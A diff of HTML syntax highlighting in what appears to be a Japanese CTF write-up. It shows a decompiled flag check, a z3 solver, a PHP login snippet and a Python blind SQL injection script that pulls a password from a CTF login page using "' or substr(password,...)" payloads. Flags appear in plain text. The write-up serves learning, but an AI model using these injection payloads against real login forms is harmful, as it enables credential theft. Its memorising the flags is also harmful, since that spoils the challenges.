+        <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">8</span>]) {
+          <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x12</span>]) {
+            <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x11</span>]) {
+              <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x14</span>]) {
+                <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">10</span>]) {
+                  <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x13</span>]) {
+                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>) {
+                      <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+                        <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+                          <span style="color:#66d9ef">if</span> (param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>) {
+                            <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd6</span>) {
+                              <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) {
+                                <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd5</span>) {
+                                  <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>) {
+                                    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2b</span>) {
+                                      <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xd</span>] <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xcf</span>) {
+                                        <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xd</span>] <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x29ba</span>) {
+                                          <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xf</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xe</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd</span>) {
+                                            <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)param_1[<span style="color:#ae81ff">0xf</span>] <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>param_1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>) {
                                               success();
                                             }
                                             <span style="color:#66d9ef">else</span> {
@@ -578,7 +578,7 @@ flag<span style="color:#f92672">{</span>Pr1m35_4r3_4W3s0m3<span style="color:#f9
 条件を渡せばそれを満たす解を求めてくれる。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solve.py" data-lang="solve.py"><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-param_1 <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag{:d}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(i), <span style="color:#ae81ff">8</span>)
+param_1 <span style="color:#f92672">=</span> [BitVec(<span style="color:#e6db74">&#34;flag{:d}&#34;</span><span style="color:#f92672">.</span>format(i), <span style="color:#ae81ff">8</span>)
         <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x15</span>)]
 s <span style="color:#f92672">=</span> Solver()
 
@@ -592,8 +592,8 @@ s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">9</
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">==</span> param_1[<span style="color:#ae81ff">0x13</span>])
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> param_1[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
-s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>))
-s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>))
+s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;4&#39;</span>))
+s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;r&#39;</span>))
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd6</span>)
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> param_1[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>)
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> param_1[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd5</span>)
@@ -605,15 +605,15 @@ s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">0xf
 s<span style="color:#f92672">.</span>add(param_1[<span style="color:#ae81ff">0xf</span>] <span style="color:#f92672">-</span> param_1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>)
 
 <span style="color:#66d9ef">while</span> True:
-    answer <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">?</span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x15</span>)]
+    answer <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x15</span>)]
     r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>check()
     <span style="color:#66d9ef">if</span> r <span style="color:#f92672">==</span> sat:
         m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
         <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> m<span style="color:#f92672">.</span>decls():
-            answer[int(d<span style="color:#f92672">.</span>name()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>))] <span style="color:#f92672">=</span> chr(
+            answer[int(d<span style="color:#f92672">.</span>name()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;flag&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>))] <span style="color:#f92672">=</span> chr(
                 m[d]<span style="color:#f92672">.</span>as_long())
-        answer <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(answer)
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Found!</span><span style="color:#e6db74">&#34;</span>)
+        answer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(answer)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Found!&#34;</span>)
         <span style="color:#66d9ef">print</span>(answer)
         exit(<span style="color:#ae81ff">0</span>)
 </code></pre></div><p>実行結果は以下の通り</p>
@@ -632,7 +632,7 @@ r34ding_4553bmly_d4bn
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">include_once &#39;flag.php&#39;;
 
 if($_SERVER[&#34;REQUEST_METHOD&#34;] == &#34;POST&#34;){
-    if(isset($_POST[&#34;ID&#34;])<span style="color:#960050;background-color:#1e0010">&amp;</span><span style="color:#960050;background-color:#1e0010">&amp;</span>isset($_POST[&#34;pwd&#34;])){
+    if(isset($_POST[&#34;ID&#34;])<span style="color:#960050;background-color:#1e0010">&amp;&amp;</span>isset($_POST[&#34;pwd&#34;])){
         if(strcmp($secretpassphrase, $_POST[&#34;pwd&#34;]) == 0){
             echo &#34;Hey, you are in!  &#34; . $_POST[&#34;ID&#34;]  . &#34;&lt;<span style="color:#f92672">br</span>&gt;&#34;;
             if($_POST[&#34;ID&#34;] == &#34;SuperUser1337&#34;){
@@ -698,30 +698,30 @@ SELECT * FROM data where password=&#39;XXXXX&#39; :)
 <span style="color:#f92672">import</span> time
 <span style="color:#f92672">import</span> string
 
-url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://cryptixctf.com/web3/login.php</span><span style="color:#e6db74">&#39;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://cryptixctf.com/web3/login.php&#39;</span>
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
-    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwd</span><span style="color:#e6db74">&#39;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> or length(password)={} #</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(i)}
+    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;pwd&#39;</span>:<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> or length(password)={} #&#34;</span><span style="color:#f92672">.</span>format(i)}
     r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>payload)
-    <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Hahaha</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Hahaha&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
         length <span style="color:#f92672">=</span> i
         <span style="color:#66d9ef">break</span>
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">length is</span><span style="color:#e6db74">&#34;</span>, length)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;length is&#34;</span>, length)
 
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
 
 <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> length):
     <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
         time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
-        payload <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwd</span><span style="color:#e6db74">&#39;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> or substr(password,{},1)= </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> #</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(a,b)}
+        payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;pwd&#39;</span>:<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> or substr(password,{},1)= </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> #&#34;</span><span style="color:#f92672">.</span>format(a,b)}
         r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>payload)
-        <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Hahaha</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
-            flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> b
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Hahaha&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            flag <span style="color:#f92672">+=</span> b
             <span style="color:#66d9ef">print</span>(flag)
             <span style="color:#66d9ef">break</span>
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag is here:</span><span style="color:#e6db74">&#34;</span>, flag)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;flag is here:&#34;</span>, flag)
 </code></pre></div><p>実行結果は以下の通り</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">:# python3 login.py 
 length is <span style="color:#ae81ff">15</span>
